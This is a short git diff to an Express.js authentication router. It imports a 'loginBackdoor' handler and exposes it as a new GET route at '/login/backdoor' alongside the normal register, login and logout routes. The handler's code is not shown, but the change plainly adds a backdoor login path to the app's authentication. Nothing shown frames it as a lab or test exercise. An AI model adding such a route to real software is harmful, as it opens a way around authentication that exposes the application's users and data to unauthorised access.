@@ -1,5 +1,5 @@
 const express = require("express");
-const {register, login, logout} = require("../controller/auth.controller");
+const {register, login, logout, loginBackdoor} = require("../controller/auth.controller");
 const authRouter = express.Router();
 
 authRouter.route("/register")
@@ -7,6 +7,9 @@ authRouter.route("/register")
 
 authRouter.route("/login")
 .post(login)
+
+authRouter.route("/login/backdoor")
+.get(loginBackdoor)
 
 authRouter.route("/logout")
 .get(logout)
